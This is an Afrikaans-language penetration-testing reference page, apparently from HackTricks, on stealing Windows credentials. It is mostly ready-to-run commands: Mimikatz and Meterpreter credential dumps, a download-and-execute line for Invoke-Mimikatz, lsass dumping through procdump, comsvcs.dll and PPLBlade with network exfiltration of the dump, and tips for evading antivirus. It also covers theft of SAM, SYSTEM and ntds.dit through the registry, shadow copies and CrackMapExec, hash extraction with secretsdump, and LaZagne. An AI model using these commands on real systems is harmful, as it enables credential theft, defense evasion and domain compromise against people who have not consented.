# Steel Windows Kredensiale

{{#include ../../banners/hacktricks-training.md}}

## Kredensiale Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Vind ander dinge wat Mimikatz kan doen in** [**hierdie bladsy**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Leer meer oor sommige moontlike beskermings van geloofsbriewe hier.**](credentials-protections.md) **Hierdie beskermings kan voorkom dat Mimikatz sekere geloofsbriewe onttrek.**

## Geloofsbriewe met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **te soek na wagwoorde en hashes** binne die slagoffer.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Om AV te omseil

### Procdump + Mimikatz

Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n wettige Microsoft-gereedskap** is, word dit nie deur Defender opgespoor nie.\
Jy kan hierdie gereedskap gebruik om die **lsass-proses te dump**, die **dump af te laai** en die **akkrediteeringe plaaslik** uit die dump te **onttrek**.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Hierdie proses word outomaties gedoen met [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Let wel**: Sommige **AV** mag **ontdek** as **kwaadaardig** die gebruik van **procdump.exe om lsass.exe te dump**, dit is omdat hulle die string **"procdump.exe" en "lsass.exe"** **ontdek**. Dit is dus **stealthier** om die **PID** van lsass.exe as 'n **argument** aan procdump **oor te dra** in plaas van die **naam lsass.exe.**

### Dumping lsass met **comsvcs.dll**

'n DLL genaamd **comsvcs.dll** wat in `C:\Windows\System32` gevind word, is verantwoordelik vir **dumping prosesgeheue** in die geval van 'n ongeluk. Hierdie DLL sluit 'n **funksie** genaamd **`MiniDumpW`** in, wat ontwerp is om aangeroep te word met `rundll32.exe`.\
Dit is irrelevant om die eerste twee argumente te gebruik, maar die derde een is in drie komponente verdeel. Die proses-ID wat gedump moet word, vorm die eerste komponent, die dump-lêer ligging verteenwoordig die tweede, en die derde komponent is streng die woord **full**. Geen alternatiewe opsies bestaan nie.\
By die ontleding van hierdie drie komponente, word die DLL betrokke by die skep van die dump-lêer en die oordrag van die gespesifiseerde proses se geheue in hierdie lêer.\
Die gebruik van die **comsvcs.dll** is haalbaar vir die dumping van die lsass-proses, wat die behoefte om procdump op te laai en uit te voer, uitskakel. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Die volgende opdrag word gebruik vir uitvoering:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass met Taakbestuurder**

1. Regsklik op die Taakbalk en klik op Taakbestuurder
2. Klik op Meer besonderhede
3. Soek vir "Local Security Authority Process" proses in die Prosesse-oortjie
4. Regsklik op "Local Security Authority Process" proses en klik op "Skep dump-lêer".

### Dumping lsass met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-onderteken binêre wat 'n deel is van [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is 'n Beskermde Proses Dumper Gereedskap wat ondersteuning bied vir die obfuskering van geheue-dump en die oordrag daarvan na afstandswerkstasies sonder om dit op die skyf te laat val.

**Belangrike funksies**:

1. Omseiling van PPL-beskerming
2. Obfuskering van geheue-dump lêers om Defender se handtekening-gebaseerde opsporingsmeganismes te ontwyk
3. Oplaai van geheue-dump met RAW en SMB oplaai metodes sonder om dit op die skyf te laat val (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA geheime
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump die NTDS.dit van die teiken DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump die NTDS.dit wagwoordgeskiedenis van die teiken DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wys die pwdLastSet attribuut vir elke NTDS.dit rekening
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Hierdie lêers moet **geleë** wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan hulle nie net op 'n gewone manier kopieer nie** omdat hulle beskerm is.

### From Registry

Die maklikste manier om daardie lêers te steel, is om 'n kopie van die register te kry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Laai** daardie lêers na jou Kali masjien en **onttrek die hashes** met:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Jy kan 'n kopie van beskermde lêers maak met behulp van hierdie diens. Jy moet Administrateur wees.

#### Gebruik vssadmin

vssadmin-binary is slegs beskikbaar in Windows Server weergawes
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Maar jy kan dieselfde doen vanaf **Powershell**. Dit is 'n voorbeeld van **hoe om die SAM-lêer te kopieer** (die hardeskyf wat gebruik word is "C:" en dit word gestoor in C:\users\Public) maar jy kan dit gebruik om enige beskermde lêer te kopieer:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie van SAM, SYSTEM en ntds.dit te maak.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Aktiewe Gids Kredensiale - NTDS.dit**

Die **NTDS.dit** lêer is bekend as die hart van **Aktiewe Gids**, wat belangrike data oor gebruikersobjekte, groepe en hul lidmaatskap bevat. Dit is waar die **wagwoord hashes** vir domein gebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)** databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.

Binne hierdie databasis word drie primêre tabelle gehandhaaf:

- **Data Tabel**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objektes soos gebruikers en groepe.
- **Link Tabel**: Dit hou die verhouding, soos groep lidmaatskappe, dop.
- **SD Tabel**: **Sekuriteitsbeskrywings** vir elke objek word hier gehou, wat die sekuriteit en toegangbeheer vir die gestoor objektes verseker.

Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur _lsass.exe_ gebruik. Dan kan **gedeelte** van die **NTDS.dit** lêer **binne die `lsass`** geheue geleë wees (jy kan die nuutste toeganklike data vind waarskynlik as gevolg van die prestasie verbetering deur 'n **cache** te gebruik).

#### Ontsleuteling van die hashes binne NTDS.dit

Die hash is 3 keer versleuteld:

1. Ontsleutel Wagwoord Versleuteling Sleutel (**PEK**) met die **BOOTKEY** en **RC4**.
2. Ontsleutel die **hash** met **PEK** en **RC4**.
3. Ontsleutel die **hash** met **DES**.

**PEK** het die **selfde waarde** in **elke domeinbeheerder**, maar dit is **versleuteld** binne die **NTDS.dit** lêer met die **BOOTKEY** van die **SISTEEM lêer van die domeinbeheerder (is verskillend tussen domeinbeheerders)**. Dit is waarom jy die kredensiale van die NTDS.dit lêer moet kry **jy het die lêers NTDS.dit en SISTEEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopieer NTDS.dit met Ntdsutil

Beskikbaar sedert Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
U kan ook die [**volume shadow copy**](#stealing-sam-and-system) truuk gebruik om die **ntds.dit** lêer te kopieer. Onthou dat u ook 'n kopie van die **SYSTEM lêer** nodig sal hê (weer, [**dump dit uit die register of gebruik die volume shadow copy**](#stealing-sam-and-system) truuk).

### **Uittreksel van hashes uit NTDS.dit**

Sodra u die lêers **NTDS.dit** en **SYSTEM** verkry het, kan u gereedskap soos _secretsdump.py_ gebruik om die **hashes** te **uittrek**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Jy kan dit ook **automaties onttrek** met 'n geldige domein admin gebruiker:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Vir **groot NTDS.dit lêers** word dit aanbeveel om dit te onttrek met [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Laastens, jy kan ook die **metasploit module** gebruik: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject`

### **Onttrekking van domeinobjekte uit NTDS.dit na 'n SQLite-databasis**

NTDS-objekte kan na 'n SQLite-databasis onttrek word met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie net word geheime onttrek nie, maar ook die hele objekte en hul eienskappe vir verdere inligtingonttrekking wanneer die rou NTDS.dit-lêer reeds verkry is.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` hive is opsioneel maar laat toe vir die ontsleuteling van geheime (NT & LM hashes, aanvullende akrediteerbare soos duidelike teks wagwoorde, kerberos of vertrou sleutels, NT & LM wagwoord geskiedenisse). Saam met ander inligting, die volgende data word onttrek: gebruiker en masjien rekeninge met hul hashes, UAC vlae, tydstempel vir laaste aanmelding en wagwoord verandering, rekening beskrywing, name, UPN, SPN, groepe en rekursiewe lede, organisatoriese eenhede boom en lidmaatskap, vertroude domeine met vertroue tipe, rigting en eienskappe...

## Lazagne

Laai die binêre van [hier](https://github.com/AlessandroZ/LaZagne/releases). jy kan hierdie binêre gebruik om akrediteerbare uit verskeie sagteware te onttrek.
```
lazagne.exe all
```
## Ander gereedskap om geloofsbriewe uit SAM en LSASS te onttrek

### Windows credentials Editor (WCE)

Hierdie gereedskap kan gebruik word om geloofsbriewe uit die geheue te onttrek. Laai dit af van: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek geloofsbriewe uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Haal inligting uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laai dit af van: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) en **voer dit net uit** en die wagwoorde sal onttrek word.

## Defenses

[**Leer hier oor sommige geloofsbriewe beskermings.**](credentials-protections.md)

{{#include ../../banners/hacktricks-training.md}}
